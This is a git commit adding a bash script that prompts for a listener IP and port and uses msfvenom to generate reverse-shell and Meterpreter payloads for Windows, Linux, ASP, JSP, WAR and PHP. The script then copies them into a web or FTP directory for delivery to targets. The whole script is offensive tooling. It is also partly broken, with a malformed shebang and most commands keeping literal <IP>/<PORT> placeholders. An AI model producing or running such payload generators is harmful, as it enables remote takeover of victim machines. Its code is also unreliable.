ade7cfa0664de479f3f663fba6711dcc54eae3e8
Mevensen <mats.f.evensen@gmail.com>
2021-06-11 11:17:22 +0200

    added script

---
+++ reverseShellAutoGen.sh
@@ -0,0 +1,42 @@
+!#/bin/bash
+
+#Input ip adress for host
+echo ip:
+read ip
+
+#Input port
+echo port:
+read port 
+
+#Choose directories to put shells /ftphome or /var/www/html/
+echo where to store rshells:
+read directory
+
+#Generate revereseshells to tmp
+
+tempd='/tmp/'
+
+msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x86.exe"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x64.exe"
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > $tempd"rshell"$port"-x86.elf"
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > $tempd"rshell"$port"-x64.elf"
+
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > $tempd"rshell"$port".asp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"rshell"$port".jsp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > $tempd"rshell"$port".war"
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > $tempd"rshell"$port".php"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > $tempd"mrshell"$port"-x86.exe"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > $tempd"mrshell"$port"-x64.exe"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > $tempd"mrshell"$port".asp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"mrshell"$port".jsp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > $tempd"mrshell"$port".war"
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"mrshell"$port".php"
+
+#Copy revereseshells
+sudo cp $tempd/*rshell* $directory
+#Clean
+
+exit 0
